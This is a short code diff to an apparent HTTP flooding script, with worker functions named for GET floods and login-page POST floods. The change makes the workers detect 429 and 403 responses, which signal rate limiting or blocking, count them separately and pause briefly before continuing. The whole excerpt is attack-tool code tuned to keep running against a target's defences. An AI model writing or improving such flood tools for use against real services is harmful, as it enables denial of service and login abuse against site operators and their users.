@@ -45,8 +45,13 @@ def http_get_flood_worker(worker_id: int):
             resp = s.recv(1024)
             s.close()
 
-            with stats_lock:
-                requests_sent += 1
+            if b"429" in resp or b"403" in resp:
+                with stats_lock:
+                    requests_failed += 1
+                time.sleep(0.04)
+            else:
+                with stats_lock:
+                    requests_sent += 1
         except Exception:
             with stats_lock:
                 requests_failed += 1
@@ -80,8 +85,13 @@ def http_post_login_flood_worker(worker_id: int):
             resp = s.recv(1024)
             s.close()
 
-            with stats_lock:
-                requests_sent += 1
+            if b"429" in resp or b"403" in resp:
+                with stats_lock:
+                    requests_failed += 1
+                time.sleep(0.04)
+            else:
+                with stats_lock:
+                    requests_sent += 1
         except Exception:
             with stats_lock:
                 requests_failed += 1
